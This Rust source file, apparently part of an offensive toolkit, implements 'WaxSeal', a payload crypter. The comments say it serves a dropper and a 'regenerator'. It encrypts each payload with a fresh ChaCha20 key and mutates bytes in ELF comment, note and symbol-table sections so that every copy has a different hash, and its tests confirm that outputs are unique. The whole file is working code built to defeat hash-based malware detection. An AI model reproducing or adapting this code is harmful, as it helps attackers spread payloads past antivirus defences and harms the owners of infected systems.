// WaxSeal: encrypts payloads at runtime before spawning.
// Each deployment gets a unique ChaCha20 key → different binary hashes.
// Used by the Stinger (dropper) and Drone (regenerator).

use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher};
use rand::Rng;

/// Generate a random 32-byte ChaCha20 key and 12-byte nonce.
pub fn generate_key() -> ([u8; 32], [u8; 12]) {
    let mut rng = rand::thread_rng();
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    rng.fill(&mut key);
    rng.fill(&mut nonce);
    (key, nonce)
}

/// Encrypt binary payload with ChaCha20. Returns (nonce || ciphertext).
pub fn seal_payload(data: &[u8]) -> Vec<u8> {
    let (key, nonce) = generate_key();
    let mut cipher = ChaCha20::new((&key).into(), (&nonce).into());
    let mut ciphertext = data.to_vec();
    cipher.apply_keystream(&mut ciphertext);

    let mut result = Vec::with_capacity(12 + ciphertext.len());
    result.extend_from_slice(&nonce);
    result.extend_from_slice(&ciphertext);
    result
}

/// Decrypt a sealed payload. Input: (nonce || ciphertext). Uses provided key.
pub fn unseal_payload(sealed: &[u8], key: &[u8; 32]) -> Option<Vec<u8>> {
    if sealed.len() < 12 { return None; }
    let nonce: [u8; 12] = sealed[..12].try_into().unwrap();
    let mut ciphertext = sealed[12..].to_vec();

    let mut cipher = ChaCha20::new(key.into(), (&nonce).into());
    cipher.apply_keystream(&mut ciphertext);

    Some(ciphertext)
}

// ── Polymorphic mutation (Weaver-style) ─────────────────────────────────────

/// Safe-to-mutate ELF section name prefixes.
const SAFE_SECTIONS: &[&str] = &[
    ".comment",
    ".note.",
    ".strtab",
    ".shstrtab",
    ".symtab",
    ".debug_",
];

/// Parse ELF64 header and collect byte ranges that are safe to mutate.
/// Returns a list of (start, end) byte offsets within the binary.
fn safe_mutation_ranges(data: &[u8]) -> Vec<(usize, usize)> {
    if data.len() < 64 {
        return vec![];
    }
    // ELF magic
    if data[0] != 0x7f || data[1] != b'E' || data[2] != b'L' || data[3] != b'F' {
        return vec![];
    }
    let is_64bit = data[4] == 2;
    if !is_64bit {
        return vec![];
    }
    // ELF64 header: e_shoff at offset 0x28, e_shentsize at 0x3A, e_shnum at 0x3C
    let shoff = u64::from_le_bytes(data[0x28..0x30].try_into().unwrap_or([0u8; 8])) as usize;
    let shentsize = u16::from_le_bytes(data[0x3A..0x3C].try_into().unwrap_or([0u8; 2])) as usize;
    let shnum = u16::from_le_bytes(data[0x3C..0x3E].try_into().unwrap_or([0u8; 2])) as usize;

    if shoff == 0 || shentsize < 64 || shnum == 0 || shnum > 128 {
        return vec![];
    }
    if shoff + (shnum * shentsize) > data.len() {
        return vec![];
    }

    let mut ranges = Vec::new();
    // Section header entry for ELF64: sh_name(4) + sh_type(4) + sh_flags(8) +
    // sh_addr(8) + sh_offset(8) + sh_size(8) + ... = 64 bytes total
    // sh_name at +0, sh_offset at +0x18, sh_size at +0x20
    for i in 0..shnum {
        let entry_off = shoff + i * shentsize;
        if entry_off + 64 > data.len() {
            break;
        }
        // Read section name offset from .shstrtab
        let sh_offset = u64::from_le_bytes(
            data[entry_off + 0x18..entry_off + 0x20].try_into().unwrap_or([0u8; 8]),
        ) as usize;
        let sh_size = u64::from_le_bytes(
            data[entry_off + 0x20..entry_off + 0x28].try_into().unwrap_or([0u8; 8]),
        ) as usize;

        if sh_size == 0 || sh_offset == 0 {
            continue;
        }
        if sh_offset + sh_size > data.len() {
            continue;
        }

        // Read the section name via .shstrtab (section 0 is .shstrtab)
        // For simplicity, match by common safe section patterns
        // by checking the section header string table index
        let sh_name = u32::from_le_bytes(
            data[entry_off..entry_off + 4].try_into().unwrap_or([0u8; 4]),
        ) as usize;

        // Get the string table section (index 0) to resolve names
        let strtab_off = u64::from_le_bytes(
            data[shoff + 0x18..shoff + 0x20].try_into().unwrap_or([0u8; 8]),
        ) as usize;
        let strtab_size = u64::from_le_bytes(
            data[shoff + 0x20..shoff + 0x28].try_into().unwrap_or([0u8; 8]),
        ) as usize;

        if strtab_off == 0 || strtab_size == 0 {
            continue;
        }
        if sh_name >= strtab_size {
            continue;
        }

        // Read the null-terminated section name
        let name_end = data[strtab_off + sh_name..]
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(0);
        let name = std::str::from_utf8(&data[strtab_off + sh_name..strtab_off + sh_name + name_end])
            .unwrap_or("");

        if SAFE_SECTIONS.iter().any(|prefix| name.starts_with(prefix)) {
            ranges.push((sh_offset, sh_offset + sh_size));
        }
    }
    ranges
}

/// Mutate binary by modifying only structure-safe areas.
/// For ELF64 binaries: mutates .comment, .note.*, .strtab sections.
/// For non-ELF or unrecognized: appends random padding (preserves executable bit).
pub fn mutate_binary(data: &[u8]) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let mut mutated = data.to_vec();
    let ranges = safe_mutation_ranges(data);

    if ranges.is_empty() {
        // No safe sections found — append padding to change hash without breaking structure
        let pad_len = rng.gen_range(64..256);
        mutated.extend(std::iter::repeat_with(|| rng.gen::<u8>()).take(pad_len));
        return mutated;
    }

    // Mutate ~1% of bytes within safe ranges (at least 1 byte per section)
    for &(start, end) in &ranges {
        if end > mutated.len() || end <= start {
            continue;
        }
        let section_len = end - start;
        let mutations = (section_len / 100).max(1);
        for _ in 0..mutations {
            let idx = rng.gen_range(start..end);
            mutated[idx] ^= rng.gen_range(1..=255);
        }
    }
    mutated
}

/// Full wax sealing: mutate + encrypt. Returns (key, encrypted_payload).
pub fn wax_seal(data: &[u8]) -> ([u8; 32], Vec<u8>) {
    let mutated = mutate_binary(data);
    let (key, nonce) = generate_key();
    let mut cipher = ChaCha20::new((&key).into(), (&nonce).into());
    let mut ciphertext = mutated;
    cipher.apply_keystream(&mut ciphertext);

    let mut result = Vec::with_capacity(12 + ciphertext.len());
    result.extend_from_slice(&nonce);
    result.extend_from_slice(&ciphertext);
    (key, result)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_seal_unseal_roundtrip() {
        let data = b"ELF binary data would go here...".to_vec();
        let sealed = seal_payload(&data);
        // Cannot test without the key — but seal generates a random one.
        // This is an integration pattern: key is passed via env var.
        assert!(sealed.len() > data.len());
    }

    #[test]
    fn test_mutation_changes_hash() {
        let data = vec![0u8; 10000];
        let m1 = mutate_binary(&data);
        let m2 = mutate_binary(&data);
        assert_ne!(m1, m2, "Each mutation should produce different output");
        // Non-ELF binaries get padding appended (length increases)
        assert!(m1.len() >= data.len());
    }

    #[test]
    fn test_mutation_preserves_elf_structure() {
        // Build a minimal valid ELF64 with a .comment section
        // ELF header
        let mut elf = vec![0u8; 64];
        elf[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
        elf[4] = 2; // 64-bit
        elf[5] = 1; // little-endian

        // Section headers: 3 entries starting at offset 256
        let shoff: u64 = 256;
        let shentsize: u16 = 64;
        let shnum: u16 = 3;
        elf[0x28..0x30].copy_from_slice(&shoff.to_le_bytes());
        elf[0x3A..0x3C].copy_from_slice(&shentsize.to_le_bytes());
        elf[0x3C..0x3E].copy_from_slice(&shnum.to_le_bytes());

        // Build .shstrtab content
        let strtab_data = b"\x00.comment\x00.shstrtab\x00";
        let strtab_off: u64 = 512;
        let strtab_sz = strtab_data.len() as u64;

        // Build .comment content
        let comment_data = b"GCC: (GNU) 12.2.0";
        let comment_off: u64 = 640;
        let comment_sz = comment_data.len() as u64;

        // Resize to hold everything
        let total_sz = (comment_off + comment_sz + 64) as usize;
        elf.resize(total_sz, 0);

        // Write .shstrtab data
        elf[strtab_off as usize..(strtab_off + strtab_sz) as usize].copy_from_slice(strtab_data);
        // Write .comment data
        elf[comment_off as usize..(comment_off + comment_sz) as usize].copy_from_slice(comment_data);

        // Section header 0: .shstrtab
        let s0 = shoff as usize;
        elf[s0..s0 + 4].copy_from_slice(&(11u32).to_le_bytes()); // name index in strtab
        elf[s0 + 0x18..s0 + 0x20].copy_from_slice(&strtab_off.to_le_bytes());
        elf[s0 + 0x20..s0 + 0x28].copy_from_slice(&strtab_sz.to_le_bytes());

        // Section header 1: dummy (no name, will be skipped)
        let _s1 = shoff as usize + 64;
        // Section header 2: .comment
        let s2 = shoff as usize + 128;
        elf[s2..s2 + 4].copy_from_slice(&(1u32).to_le_bytes()); // name = "\0.comment"
        elf[s2 + 0x18..s2 + 0x20].copy_from_slice(&comment_off.to_le_bytes());
        elf[s2 + 0x20..s2 + 0x28].copy_from_slice(&comment_sz.to_le_bytes());

        let mutated = mutate_binary(&elf);
        assert_eq!(mutated.len(), elf.len(),
            "ELF mutation must preserve length");
        // ELF magic intact
        assert_eq!(&mutated[..4], &elf[..4], "ELF magic preserved");
        // .comment section changed
        let c_start = comment_off as usize;
        let c_end = c_start + comment_sz as usize;
        assert_ne!(&mutated[c_start..c_end], &elf[c_start..c_end],
            ".comment section must be mutated");
    }

    #[test]
    fn test_wax_seal_produces_unique_output() {
        let data = vec![0x41u8; 5000];
        let (k1, s1) = wax_seal(&data);
        let (k2, s2) = wax_seal(&data);
        assert_ne!(s1, s2, "Each wax seal must be unique");
        assert_ne!(k1, k2, "Each key must be unique");
    }
}
